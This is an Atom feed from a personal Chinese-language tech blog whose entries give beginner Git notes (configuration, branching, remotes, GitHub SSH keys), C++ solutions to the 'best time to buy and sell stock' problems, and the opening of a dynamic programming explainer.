<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title><![CDATA[Monkee]]></title>
  <subtitle><![CDATA[Stay Hungry Stay Foolish]]></subtitle>
  <link href="/atom.xml" rel="self"/>
  <link href="http://m0nkee.github.io/"/>
  <updated>2015-11-26T09:11:48.724Z</updated>
  <id>http://m0nkee.github.io/</id>
  
  <author>
    <name><![CDATA[Monkee Lei]]></name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title><![CDATA[Git小记]]></title>
    <link href="http://m0nkee.github.io/2015/11/26/about-git/"/>
    <id>http://m0nkee.github.io/2015/11/26/about-git/</id>
    <published>2015-11-26T09:09:03.000Z</published>
    <updated>2015-11-26T09:11:48.724Z</updated>
    <content type="html"><![CDATA[<h2 id="关于版本控制">关于版本控制</h2><p>本地版本控制系统<br><img src="http://git-scm.com/figures/18333fig0101-tn.png" alt="本地版本控制系统"></p>
<p>集中式版本控制系统(CVCS)<br><img src="https://dn-anything-about-doc.qbox.me/userid1labid485time1423114955957" alt="集中式版本控制系统"></p>
<p>分布式版本控制系统(DVCS)<br><img src="https://dn-anything-about-doc.qbox.me/userid1labid485time1423115040073" alt="分布式版本控制系统"></p>
<h2 id="git特点">git特点</h2><ul>
<li><p>直接记录快照，而非差异比较</p>
<blockquote>
<p>Git 和其他版本控制系统的主要差别在于，Git 只关心文件数据的整体是否发生变化，而大多数其他系统则只关心文件内容的具体差异。</p>
</blockquote>
</li>
<li><p>近乎所以的操作是本地执行</p>
</li>
<li><p>时刻保持数据的完整性</p>
<blockquote>
<p>在保存到 Git之前，所有数据都要进行内容的校验和（checksum）计算，并将此结果作为数据的唯一标识和索引。<br>Git 使用 SHA-1 算法计算数据的校验和，通过对文件的内容或目录的结构计算出一个 SHA-1 哈希值，作为指纹字符串。</p>
</blockquote>
</li>
<li><p>多数操作仅添加数据</p>
</li>
<li><p>文件对三种状态</p>
<blockquote>
</blockquote>
</li>
</ul>
<ol>
<li>已提交（committed）：表示文件已被安全地保存在本地数据库中了。</li>
<li>已修改（modified）:表示修改了某个文件，但还没有提交保存。</li>
<li>已暂存（staged）：表示把已修改的文件放到下次提交时要保存的清单了。</li>
</ol>
<p>文件流转三个工作区：git的工作目录区，暂存区，本地仓库</p>
<p><img src="http://git-scm.com/figures/18333fig0106-tn.png" alt="文件流转"></p>
<p>每个项目都有一个 Git 目录（译注：如果 git clone 出来的话，就是其中 .git 的目录；如果 git clone –bare 的话，新建的目录本身就是 Git 目录。），它是 Git 用来保存元数据和对象数据库的地方。该目录非常重要，每次克隆镜像仓库的时候，实际拷贝的就是这个目录里面的数据。</p>
<p>从项目中取出某个版本的所有文件和目录，用以开始后续工作的叫做工作目录。这些文件实际上都是从 Git 目录中的压缩对象数据库中提取出来的，接下来就可以在工作目录中对这些文件进行编辑。</p>
<p>所谓的暂存区域只不过是个简单的文件，一般都放在 Git 目录中。有时候人们会把这个文件叫做索引文件，不过标准说法还是叫暂存区域。</p>
<p>基本的 Git 工作流程如下：</p>
<blockquote>
<ol>
<li>在工作目录中修改某些文件。</li>
<li>对修改后的文件进行快照，然后保存到暂存区域。</li>
<li>提交更新，将保存在暂存区域的文件快照永久转储到 Git 目录中。</li>
</ol>
</blockquote>
<p>文件状态变化周期<br><img src="http://git-scm.com/figures/18333fig0201-tn.png" alt="文件状态变化周期"><br>其中灰色箭头表示文件未跟踪状态，红色箭头表示文件已跟踪状态。</p>
<h2 id="git安装">git安装</h2><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-<span class="keyword">get</span> install  <span class="comment"># hehe</span></span><br></pre></td></tr></table></figure>
<h2 id="git初始化配置">git初始化配置</h2><p>命令工具：<code>git config</code> or <code>git-config</code>  –&gt;用来配置和读取相应的工作环境变量。</p>
<ul>
<li><code>/etc/gitconifg</code>文件：系统中对所有用户都普遍适用的配置。使用命令<code>git config --system</code>就是读取该文件。</li>
<li><code>~/.gitconfig</code>文件：用户目录下的配置文件只适用于该用户。使用命令<code>git config --global</code>就是读取该文件。</li>
<li><code>.git/config</code>文件：对当前项目有效。该配置文件会覆盖掉<code>/etc/gitconfig</code>中的同名变量。</li>
</ul>
<h3 id="配置用户信息">配置用户信息</h3><p>首先需要配置个人用户名和邮件地址。命令：<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user<span class="class">.name</span> <span class="string">"monkee"</span></span><br><span class="line">git config --global user<span class="class">.email</span> monkee_lei@sina.com</span><br></pre></td></tr></table></figure></p>
<h3 id="文本编辑器配置">文本编辑器配置</h3><p>默认是vi or vim<br><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git conifg --<span class="keyword">global</span> core.<span class="keyword">editor</span> emacs</span><br></pre></td></tr></table></figure></p>
<h3 id="差异分析工具">差异分析工具</h3><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config --<span class="keyword">global</span> <span class="keyword">merge</span>.tool vimdiff</span><br></pre></td></tr></table></figure>
<p>git可以理解的合并工具有：kdiff3，tkdiff，meld，xxdiff，emerge，vimdiff，gvimdiff，ecmerge，和 opendiff 等</p>
<h3 id="查看配置信息">查看配置信息</h3><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config <span class="comment">--list</span></span><br></pre></td></tr></table></figure>
<h2 id="帮助信息">帮助信息</h2><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#三种方式</span><br><span class="line">git help &lt;verb&gt;</span><br><span class="line">git  &lt;verb&gt; --help</span><br><span class="line"><span class="keyword">man</span> git-&lt;verb&gt;</span><br></pre></td></tr></table></figure>
<h2 id="git创建仓库或克隆仓库">git创建仓库或克隆仓库</h2><p>在工作目录中初始化新仓库<br><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">git</span> init  <span class="comment">#执行后目录下会创建一个名为.git的目录</span></span><br></pre></td></tr></table></figure></p>
<p>将当前目录下的文件纳入版本控制<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">add</span> filename  <span class="comment">#告诉git开始跟踪这些文件</span></span><br><span class="line">git commit -m <span class="string">'initial project version'</span>  <span class="comment"># 提交</span></span><br><span class="line"><span class="comment">#合并以上两步</span></span><br><span class="line">git commit -<span class="operator">a</span> -m</span><br></pre></td></tr></table></figure></p>
<p>克隆现有的仓库<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git <span class="keyword">clone</span> [url]</span><br><span class="line"><span class="comment"># example</span></span><br><span class="line">git <span class="keyword">clone</span> git:<span class="comment">//github.com/schacon/grit.git </span></span><br><span class="line"><span class="comment">#当前目录下会创建一个名为grit的目录，目录下会有包含一个.git子目录，同样也可以修改目录名</span></span><br><span class="line">git <span class="keyword">clone</span> git:<span class="comment">//github.com/schacon/grit.git mygrit</span></span><br></pre></td></tr></table></figure></p>
<h2 id="检测文件状态">检测文件状态</h2><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">git</span> status</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看详细的文件修改,显示当前文件与暂存文本之间的差异</span></span><br><span class="line">git diff</span><br></pre></td></tr></table></figure>
<h2 id="移除文件">移除文件</h2><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="keyword">rm</span> &lt;<span class="keyword">file</span>&gt; # 对于修改过且放进暂存区的文件，必须加参数-<span class="literal">f</span></span><br></pre></td></tr></table></figure>
<h2 id="移动文件">移动文件</h2><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">git</span> mv file_from file_to</span><br></pre></td></tr></table></figure>
<p><code>git mv</code>相当于三条命令：<br><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="label">mv</span> file_from file_to</span><br><span class="line"><span class="label">git</span> rm file_from</span><br><span class="line"><span class="label">git</span> <span class="keyword">add </span>file_to</span><br></pre></td></tr></table></figure></p>
<h2 id="查看提交历史">查看提交历史</h2><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="command">log</span></span><br></pre></td></tr></table></figure>
<p>参数说明</p>
<table>
<thead>
<tr>
<th style="text-align:center">选项</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>-p</code></td>
<td style="text-align:center">展开显示每次提交内容差异</td>
</tr>
<tr>
<td style="text-align:center"><code>-n</code></td>
<td style="text-align:center">显示最近的n次更新</td>
</tr>
<tr>
<td style="text-align:center"><code>--stat</code></td>
<td style="text-align:center">增改行统计</td>
</tr>
<tr>
<td style="text-align:center"><code>--word-diff</code></td>
<td style="text-align:center">按word diff格式显示差异</td>
</tr>
<tr>
<td style="text-align:center"><code>--abbrev-commit</code></td>
<td style="text-align:center">仅显示SHA-1的前几个字符</td>
</tr>
<tr>
<td style="text-align:center"><code>--pretty</code></td>
<td style="text-align:center">使用其他格式显示历史提交信息。可用的选项包括 oneline，short，full，fuller和format（后跟指定格式）</td>
</tr>
<tr>
<td style="text-align:center"><code>--since,--after</code></td>
<td style="text-align:center">仅显示指定时间之后的提交</td>
</tr>
<tr>
<td style="text-align:center"><code>--until,--before</code></td>
<td style="text-align:center">仅显示指定时间之前的提交</td>
</tr>
<tr>
<td style="text-align:center"><code>-author</code></td>
<td style="text-align:center">仅显示指定作者相关提交</td>
</tr>
<tr>
<td style="text-align:center"><code>--committer</code></td>
<td style="text-align:center">仅显示指定提交者相关的提交</td>
</tr>
</tbody>
</table>
<h2 id="撤销操作">撤销操作</h2><p>撤销操作<em>不可逆</em></p>
<ul>
<li><p>修改最后一次提交</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">git</span> commit --amend  <span class="comment">#重新提交</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>取消已经暂存的文件</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="operator"><span class="keyword">reset</span> <span class="keyword">HEAD</span> &lt;<span class="keyword">file</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>取消对文件的修改</p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkoout <span class="comment">--&lt;file&gt;</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="远程仓库使用">远程仓库使用</h2><ul>
<li><p>查看当前的远程库</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">git</span> remote  <span class="comment">#至少可以看到一个origin的远程库，git默认使用这个名字来标识所克隆的原始仓库</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#加参数-v，显示对应的克隆地址</span></span><br><span class="line">git remote -v</span><br></pre></td></tr></table></figure>
</li>
<li><p>添加远程仓库</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">git</span> <span class="tag">remote</span> <span class="tag">add</span> <span class="attr_selector">[shortname]</span> <span class="attr_selector">[url]</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>从远程仓库仓库抓取数据</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">git</span> fetch<span class="sqbracket"> [remote-name]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#例如</span></span><br><span class="line"><span class="keyword">git</span> fetch origin</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>如果设置了某个分支用于跟踪某个远端仓库的分支（参见下节及第三章的内容），可以使用<code>git pull</code>命令自动抓取数据下来，然后将远端分支自动合并到本地仓库中当前分支。在日常工作中我们经常这么用，既快且好。实际上，默认情况下 <code>git clone</code>命令本质上就是自动创建了本地的   <code>master</code> 分支用于跟踪远程仓库中的 <code>master</code> 分支（假设远程仓库确实有 <code>master</code> 分支）。所以一般我们运行 <code>git pull</code>，目的都是要从原始克隆的远端仓库中抓取数据后，合并到工作目录中的当前分支。</p>
<ul>
<li><p>推送数据到远程仓库</p>
<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="label">git</span> <span class="keyword">push </span>[remote-name] [<span class="keyword">branch-name]</span><br><span class="line"></span></span><br><span class="line">#例如将<span class="keyword">bending的master分支推送到origin服务器上</span><br><span class="line"></span><span class="label">git</span> <span class="keyword">push </span>origin master</span><br></pre></td></tr></table></figure>
</li>
<li><p>查看远程仓库信息</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git remote <span class="operator"><span class="keyword">show</span> [remote-<span class="keyword">name</span>]</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="分支">分支</h2><p>分支一个很重要的作用是：<strong>分支开发工作流</strong></p>
<ul>
<li><p>查看分支</p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="command">log</span> <span class="comment">--decorate</span></span><br><span class="line"></span><br><span class="line">git <span class="command">log</span> <span class="comment">--decorate --graph --all</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>分支的创建 &amp; 删除</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git branch branch-name  <span class="comment">#创建</span></span><br><span class="line">git branch <span class="operator">-d</span> branch-name <span class="comment">#删除</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>分支切换</p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#分支切换会改变你工作目录中的文件</span></span><br><span class="line">git checkout branch-<span class="property">name</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#创建并切换分支</span></span><br><span class="line">git checkout -b branch-<span class="property">name</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#创建并切换分支</span></span><br><span class="line">git checkout -b branch-<span class="property">name</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>分支的合并</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git checkout master  <span class="comment">#切换到master分支</span></span><br><span class="line">git <span class="built_in">merge</span> testing  <span class="comment">#合并分支master和分支testing</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>合并时需注意分支的创建对先后关系以及是否属于同一分支等问题。</p>
<ul>
<li>显示分支<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">git</span> branch <span class="comment"># 加选项-v可以显示更详细的信息</span></span><br><span class="line"><span class="comment">#--merged与--no-merged这两个有用的选项可以过滤这个列表中已经合并或尚未合并到当前分支的分支</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="git支持的协议">git支持的协议</h2><p>git可以使用四种主要的协议来传输资料：本地协议（local）、HTTP协议、SSH(Secure Shell)协议和git协议。</p>
<h2 id="play_with_github">play with github</h2><p>github是一个git版本库托管商，很多开源项目都是使用github实现托管的。</p>
<ul>
<li>SSH公钥的生成</li>
</ul>
<p>github使用SSH公钥进行认证。默认情况下，用户的SSH密钥存放在<code>~/.ssh</code>目录下，我们需要查看是否有以<code>id_dsa</code>或<code>id_rsa</code>命名的文件，其中一个带有<code>.pub</code>扩展名，即为公钥，另一个为私钥。如果没有该文件或者没有<code>.ssh</code>目录，可以使用<code>ssh-keygen</code>生成。</p>
<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -<span class="keyword">C</span> <span class="string">"monkee_lei@sina.com"</span></span><br></pre></td></tr></table></figure>
<p>登陆github添加公共密钥。</p>
<p>验证是否配置成功<br><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh -T git@github.com</span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line">Hi username! You've successfully authenticated, <span class="keyword">but</span> GitHub <span class="keyword">does</span> <span class="keyword">not</span> provide shell access.</span><br></pre></td></tr></table></figure></p>
<h2 id="在服务器上搭建自己的git">在服务器上搭建自己的git</h2><hr>
<p>参考：<br><a href="http://gitbook.liuhui998.com/" target="_blank" rel="external">git community book 中文版</a><br><a href="http://git-scm.com/book/zh/v2/" target="_blank" rel="external">pro git</a><br><a href="https://help.github.com/articles/generating-ssh-keys/" target="_blank" rel="external">Generating SSH keys</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h2 id="关于版本控制">关于版本控制</h2><p>本地版本控制系统<br><img src="http://git-scm.com/figures/18333fig0101-tn.png" alt="本地版本控制系统"></p>
<p>集中式版本控制系统(CVCS)<b]]>
    </summary>
    
      <category term="git" scheme="http://m0nkee.github.io/tags/git/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[best time to buy and sell stock]]></title>
    <link href="http://m0nkee.github.io/2015/09/02/stock/"/>
    <id>http://m0nkee.github.io/2015/09/02/stock/</id>
    <published>2015-09-02T08:12:55.000Z</published>
    <updated>2015-09-02T08:23:17.883Z</updated>
    <content type="html"><![CDATA[<h2 id="best_time_to_buy_and_sell_stock_I">best time to buy and sell stock I</h2><p><strong>Description:</strong> Say you have an array for which the ith element is the price of a given stock on day i. If you were only permitted to complete at most one transaction (ie, buy one and sell one share of the stock), design an algorithm to find<br>the maximum profit.</p>
<p><strong>题意：</strong>用一个数组表示股票每天的价格，数组的第i个数表示股票在第i天的价格。 如果只允许进行一次交易，也就是说只允许买一支股票并卖掉，求最大的收益</p>
<p><strong>分析：</strong>动态规划法。从前向后遍历数组，记录当前出现过的最低价格，作为买入价格，并计算以当天价格出售的收益，作为可能的最大收益，整个遍历过程中，出现过的最大收益就是所求。</p>
<p>时间复杂度O(n)，空间复杂度O(1)</p>
<h2 id="best_time_to_buy_and_sell_stock_II">best time to buy and sell stock II</h2><p><strong>Description:</strong> Say you have an array for which the ith element is the price of a given stock on day i. Design an algorithm to find the maximum profit. You may complete as many transactions as you like (ie, buy one and sell one share of the stock multiple times). However, you may not engage in multiple transactions at the same time (ie, you must sell the stock before you buy again).</p>
<p><strong>题目：</strong>用一个数组表示股票每天的价格，数组的第i个数表示股票在第i天的价格。交易次数不限，但一次只能交易一支股票，也就是说手上最多只能持有一支股票，求最大收益。</p>
<p><strong>分析：</strong>贪心法。从前向后遍历数组，只要当天的价格高于前一天的价格，就算入收益。</p>
<p>时间复杂度O(n)，空间复杂度O(1)</p>
<h2 id="best_time_to_buy_and_sell_stock_III">best time to buy and sell stock III</h2><p><strong>Description:</strong> Say you have an array for which the ith element is the price of a given stock on day i. Design an algorithm to find the maximum profit. You may complete at most two transactions. Note: You may not engage in multiple transactions at the same time (ie, you must sell the stock before you buy again).</p>
<p><strong>题意：</strong>用一个数组表示股票每天的价格，数组的第i个数表示股票在第i天的价格。最多交易两次，手上最多只能持有一支股票，求最大收益。</p>
<p><strong>分析：</strong>动态规划法。以第i天为分界线，计算第i天之前进行一次交易的最大收益preProfit[i]，和第i天之后进行一次交易的最大收益postProfit[i]，最后遍历一遍，max{preProfit[i] + postProfit[i]} (0≤i≤n-1)就是最大收益。第i天之前和第i天之后进行一次的最大收益求法同Best Time to Buy and Sell Stock I。</p>
<p>时间复杂度O(n)，空间复杂度O(n)</p>
<h2 id="代码实现">代码实现</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">stock1</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &amp;prices)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> minp,maxprofit;</span><br><span class="line"></span><br><span class="line">	minp = prices[<span class="number">0</span>];</span><br><span class="line">	maxprofit = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;prices.size();i++)&#123;</span><br><span class="line">		<span class="keyword">if</span> (minp &gt; prices[i])</span><br><span class="line">		&#123;</span><br><span class="line">			minp = prices[i];</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(maxprofit &lt; prices[i] - minp)</span><br><span class="line">		&#123;</span><br><span class="line">			maxprofit = prices[i] - minp;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> maxprofit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">stock2</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &amp;prices)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> maxprofit = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;prices.size();i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (prices[i]&gt;prices[i-<span class="number">1</span>])</span><br><span class="line">		&#123;</span><br><span class="line">			maxprofit += prices[i] - prices[i-<span class="number">1</span>];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> maxprofit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">stock3</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &amp;prices)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> maxprofit = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> tmp;</span><br><span class="line">	<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; prices1;</span><br><span class="line">	<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; prices2;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;prices.size()-<span class="number">1</span>;i++)</span><br><span class="line">	&#123;</span><br><span class="line"></span><br><span class="line">		prices1.reserve(i);</span><br><span class="line">		prices2.reserve(prices.size()-<span class="number">1</span>);</span><br><span class="line">		prices1.insert(prices1.begin(),&amp;prices.front(),&amp;prices[i]);</span><br><span class="line">		prices2.insert(prices2.begin(),&amp;prices[i-<span class="number">1</span>],&amp;(prices.back()));</span><br><span class="line">		<span class="comment">//cout&lt;&lt;"front:"&lt;&lt;prices1.front()&lt;&lt;" back:"&lt;&lt;prices1.back()&lt;&lt;endl;</span></span><br><span class="line">		<span class="comment">//cout&lt;&lt;"front:"&lt;&lt;prices2.front()&lt;&lt;" back:"&lt;&lt;prices2.back()&lt;&lt;endl;</span></span><br><span class="line">		tmp = stock1(prices1) + stock1(prices2);</span><br><span class="line">		<span class="keyword">if</span> (maxprofit &lt; tmp)</span><br><span class="line">		&#123;</span><br><span class="line">			maxprofit = tmp;</span><br><span class="line">		&#125;</span><br><span class="line">		prices1.clear();</span><br><span class="line">		prices2.clear();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> maxprofit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> p[<span class="number">12</span>] = &#123;<span class="number">3</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">9</span>&#125;;</span><br><span class="line">	<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; prices(&amp;p[<span class="number">0</span>],&amp;p[<span class="number">12</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="string">"max profit1:"</span>&lt;&lt;stock1(prices)&lt;&lt;endl;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="string">"max profit2:"</span>&lt;&lt;stock2(prices)&lt;&lt;endl;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="string">"max profit3:"</span>&lt;&lt;stock3(prices)&lt;&lt;endl;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    <summary type="html">
    <![CDATA[<h2 id="best_time_to_buy_and_sell_stock_I">best time to buy and sell stock I</h2><p><strong>Description:</strong> Say you have an array for ]]>
    </summary>
    
      <category term="dynamic_programming" scheme="http://m0nkee.github.io/tags/dynamic-programming/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[动态规划]]></title>
    <link href="http://m0nkee.github.io/2015/09/02/dynamic-programming/"/>
    <id>http://m0nkee.github.io/2015/09/02/dynamic-programming/</id>
    <published>2015-09-02T07:35:24.000Z</published>
    <updated>2015-09-03T03:48:45.138Z</updated>
    <content type="html"><![CDATA[<h2 id="动态规划_(Dynamic_Programming)">动态规划 (Dynamic Programming)</h2><p>适用于<strong>重叠子问题</strong>和<strong>最优子结构</strong>性质的问题。</p>
<p>大致思路:<br>待解决一个问题 –&gt; 将其分解成不同部分（即子问题） –&gt; 求解子问题 –&gt; 合并子问题的解，得出原问题的解 </p>
<p>最优子结构：局部最优解决定全局最优解</p>
<p>适用情况：</p>
<ol>
<li>最优结构性质</li>
<li>无后效性。即子问题的解一旦确定，就不会改变。</li>
<li>子问题重叠性质</li>
</ol>
